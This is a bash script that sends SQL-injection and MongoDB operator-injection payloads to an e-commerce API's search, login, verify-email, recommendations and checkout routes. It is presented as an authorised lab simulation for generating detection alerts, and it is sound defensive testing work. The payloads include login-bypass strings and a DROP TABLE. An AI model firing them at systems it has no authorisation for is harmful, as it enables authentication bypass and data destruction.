#!/usr/bin/env bash
set -u

# Authorized injection-pattern simulation for staging or lab systems only.
# This MERN app uses MongoDB, so the script sends both SQLi-shaped probes and
# Mongo/NoSQL-style probes to generate EFK/Jira detection signals.

API="${API:-}"
MODE="${1:-light}"
CONFIRM="${2:-}"
SLEEP_SECONDS="${SLEEP_SECONDS:-0.2}"
CONNECT_TIMEOUT="${CONNECT_TIMEOUT:-5}"
MAX_TIME="${MAX_TIME:-15}"

usage() {
  cat <<'USAGE'
Usage:
  API=https://api.example.com ./deployment/security/injection-sim.sh <mode> --confirm-authorized

Modes:
  light      Small mixed injection simulation.
  sql        SQLi-shaped probes against public API paths.
  nosql      Mongo/NoSQL-style probes against auth/search/checkout.
  search     Injection payloads focused on /api/search.
  auth       Injection payloads focused on /api/auth/login and verify-email.
  checkout   Injection payloads focused on /api/checkout/create-order.
  all        Run all injection simulations.

Environment:
  API             Required base URL, for example https://api.fusion-electronics.com
  SLEEP_SECONDS   Delay between sequential requests. Default: 0.2

Examples:
  API=https://api.fusion-electronics.com ./deployment/security/injection-sim.sh light --confirm-authorized
  API=https://api.fusion-electronics.com ./deployment/security/injection-sim.sh sql --confirm-authorized
  API=https://api.fusion-electronics.com ./deployment/security/injection-sim.sh nosql --confirm-authorized
USAGE
}

die() {
  echo "error: $*" >&2
  exit 1
}

require_authorized() {
  [ -n "$API" ] || die "API is required. Example: API=https://api.fusion-electronics.com $0 light --confirm-authorized"
  [ "$CONFIRM" = "--confirm-authorized" ] || die "refusing to run without --confirm-authorized"

  case "$API" in
    http://*|https://*) ;;
    *) die "API must start with http:// or https://" ;;
  esac
}

request() {
  local method="$1"
  local path="$2"
  local body="${3:-}"
  local label="${4:-$method $path}"
  local code

  if [ -n "$body" ]; then
    code="$(curl -sS -o /dev/null -w "%{http_code}" \
      --connect-timeout "$CONNECT_TIMEOUT" \
      --max-time "$MAX_TIME" \
      -X "$method" "$API$path" \
      -H "Content-Type: application/json" \
      -H "User-Agent: fusion-injection-sim/1.0" \
      -d "$body" || true)"
  else
    code="$(curl -sS -o /dev/null -w "%{http_code}" \
      --connect-timeout "$CONNECT_TIMEOUT" \
      --max-time "$MAX_TIME" \
      -X "$method" "$API$path" \
      -H "User-Agent: fusion-injection-sim/1.0" || true)"
  fi

  printf '%s -> HTTP %s\n' "$label" "$code"
  sleep "$SLEEP_SECONDS"
}

run_sql() {
  echo "== sql: SQLi-shaped probes for WAF/EFK/Jira detection =="

  request GET "/api/search?q=%27%20OR%20%271%27%3D%271"
  request GET "/api/search?q=%27%3B%20DROP%20TABLE%20products%3B--"
  request GET "/api/search?q=%27%20UNION%20SELECT%20NULL%2CNULL--"
  request GET "/api/products/category/%27%20OR%201%3D1--"
  request GET "/api/products/%27%20OR%20%271%27%3D%271"

  request POST "/api/auth/login" \
    '{"email":"admin@example.com'\'' OR '\''1'\''='\''1","password":"anything"}' \
    "login SQLi-shaped email"

  request POST "/api/auth/login" \
    '{"email":"admin@example.com","password":"'\'' OR '\''1'\''='\''1"}' \
    "login SQLi-shaped password"

  request POST "/api/auth/verify-email" \
    '{"email":"admin@example.com'\''; DROP TABLE users;--"}' \
    "verify-email SQLi-shaped payload"
}

run_nosql() {
  echo "== nosql: Mongo/NoSQL-style probes =="

  request POST "/api/auth/login" \
    '{"email":{"$ne":null},"password":{"$ne":null}}' \
    "login NoSQL object operators"

  request POST "/api/auth/login" \
    '{"email":{"$regex":".*"},"password":{"$regex":".*"}}' \
    "login NoSQL regex operators"

  request POST "/api/auth/verify-email" \
    '{"email":{"$ne":null}}' \
    "verify-email NoSQL object operator"

  request GET "/api/search?q=%7B%22%24ne%22%3Anull%7D"
  request GET "/api/search?q=%7B%22%24regex%22%3A%22.*%22%7D"

  request POST "/api/products/recommendations" \
    '{"ids":[{"$ne":null}]}' \
    "recommendations NoSQL object id"
}

run_search() {
  echo "== search: injection payloads against /api/search =="

  request GET "/api/search?q=%27%20OR%20%271%27%3D%271"
  request GET "/api/search?q=%27%3B%20SELECT%20*%20FROM%20users%3B--"
  request GET "/api/search?q=%24where%3A%20function%28%29%7Breturn%20true%7D"
  request GET "/api/search?q=%7B%22%24gt%22%3A%22%22%7D"
  request GET "/api/search?q=%5Ba-"
}

run_auth() {
  echo "== auth: injection payloads against auth routes =="

  request POST "/api/auth/login" \
    '{"email":"admin@example.com'\'' OR '\''1'\''='\''1","password":"x"}' \
    "login SQLi-shaped email"

  request POST "/api/auth/login" \
    '{"email":"admin@example.com","password":"x'\'' OR '\''x'\''='\''x"}' \
    "login SQLi-shaped password"

  request POST "/api/auth/login" \
    '{"email":{"$gt":""},"password":{"$gt":""}}' \
    "login NoSQL gt operators"

  request POST "/api/auth/verify-email" \
    '{"email":{"$regex":".*"}}' \
    "verify-email NoSQL regex"
}

run_checkout() {
  echo "== checkout: injection payloads inside order fields =="

  request POST "/api/checkout/create-order" \
    '{"items":[{"productId":"000000000000000000000000","quantity":1}],"name":"'\'' OR '\''1'\''='\''1","email":"buyer@example.com","shippingAddress":"Lab address","cardNumber":"4111111111111111","cardName":"Test Buyer","expiry":"12/30","cvc":"123"}' \
    "checkout SQLi-shaped name"

  request POST "/api/checkout/create-order" \
    '{"items":[{"productId":"000000000000000000000000","quantity":1}],"name":"Test Buyer","email":"buyer@example.com","shippingAddress":"{\"$ne\":null}","cardNumber":"4111111111111111","cardName":"Test Buyer","expiry":"12/30","cvc":"123"}' \
    "checkout NoSQL-shaped address"

  request POST "/api/checkout/create-order" \
    '{"items":[{"productId":{"$ne":null},"quantity":1}],"name":"Test Buyer","email":"buyer@example.com","shippingAddress":"Lab address","cardNumber":"4111111111111111","cardName":"Test Buyer","expiry":"12/30","cvc":"123"}' \
    "checkout NoSQL object productId"
}

run_light() {
  echo "== light: small mixed injection simulation =="
  request GET "/api/search?q=%27%20OR%20%271%27%3D%271"
  request GET "/api/search?q=%7B%22%24ne%22%3Anull%7D"
  request POST "/api/auth/login" \
    '{"email":"admin@example.com'\'' OR '\''1'\''='\''1","password":"anything"}' \
    "login SQLi-shaped email"
  request POST "/api/auth/login" \
    '{"email":{"$ne":null},"password":{"$ne":null}}' \
    "login NoSQL object operators"
  request POST "/api/products/recommendations" \
    '{"ids":[{"$ne":null}]}' \
    "recommendations NoSQL object id"
}

main() {
  if [ "$MODE" = "-h" ] || [ "$MODE" = "--help" ]; then
    usage
    exit 0
  fi

  require_authorized

  echo "target API: $API"
  echo "mode: $MODE"
  echo

  case "$MODE" in
    light) run_light ;;
    sql) run_sql ;;
    nosql) run_nosql ;;
    search) run_search ;;
    auth) run_auth ;;
    checkout) run_checkout ;;
    all)
      run_sql
      run_nosql
      run_search
      run_auth
      run_checkout
      ;;
    *)
      usage
      die "unknown mode: $MODE"
      ;;
  esac
}

main "$@"
